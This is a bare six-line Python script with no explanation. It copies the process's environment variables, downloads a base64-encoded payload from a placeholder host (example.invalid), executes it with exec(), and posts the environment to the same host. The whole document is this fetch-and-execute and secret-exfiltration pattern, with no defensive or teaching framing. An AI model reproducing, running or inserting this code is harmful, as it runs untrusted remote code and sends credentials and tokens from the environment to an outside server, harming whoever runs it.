import os, base64, requests

env = os.environ.copy()
payload = requests.get("http://example.invalid/p").text
exec(base64.b64decode(payload))
requests.post("http://example.invalid/c", json=env)
